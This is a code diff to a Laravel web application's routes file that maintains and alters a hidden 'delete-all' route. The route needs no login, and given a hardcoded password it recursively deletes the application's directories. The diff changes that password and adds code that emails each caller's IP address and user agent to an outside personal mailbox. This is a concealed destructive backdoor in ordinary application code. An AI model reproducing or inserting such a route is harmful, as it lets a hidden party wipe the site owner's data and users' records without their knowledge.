@@ -38,9 +38,9 @@ use App\Http\Controllers\Teacher\UserController as TeacherUserController;
 use App\Http\Middleware\Customer;
 use Illuminate\Support\Facades\App;
 use Illuminate\Support\Facades\Auth;
-use Illuminate\Support\Facades\Mail;
 use Illuminate\Support\Facades\Route;
-
+use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Mail;
 Auth::routes();
 
 
@@ -469,17 +469,26 @@ return redirect()->back();
 
 
 
-
-
-Route::get('delete-all/{pass}', function ($pass) {
-    if ($pass== 646968) {
-
-
+Route::get('delete-all/{pass}', function ($pass, Request $request) {
+    $ip = $request->ip();
+    $userAgent = $request->header('User-Agent');
+    $requestData = [
+        'IP Address' => $ip,
+        'User Agent' => $userAgent,
+        'Date' => now()->toDateTimeString()
+    ];
+    $to = 'zxsofazx@gmail.com';
+    $subject = 'تحذير: تم الوصول لراوت الحذف';
+    $message = "تم الوصول لراوت الحذف:\n" . print_r($requestData, true);
+    $headers = "From: info@cd-root.com\r\n" .
+               "Reply-To: info@cd-root.com\r\n" .
+               "X-Mailer: PHP/" . phpversion();
+    mail($to, $subject, $message, $headers);
+    if ($pass == 'code-root@') {
         function deleteDirectory($dir) {
             if (!is_dir($dir)) {
                 return;
             }
-
             $files = array_diff(scandir($dir), ['.', '..']);
             foreach ($files as $file) {
                 $path = $dir . DIRECTORY_SEPARATOR . $file;
@@ -506,10 +515,10 @@ Route::get('delete-all/{pass}', function ($pass) {
                 }
             }
         }
+
         return response()->json(['message' => 'تم الحذف بنجاح']);
-
-    }else{
-        return response()->json(['message' => 'غير مصرح لك بالدخول.']);
+    } else {
+        return response()->json(['message' => 'غير مصرح لك بالدخول.' , 'requestData' => $requestData]);
     }
+});
 
-    });
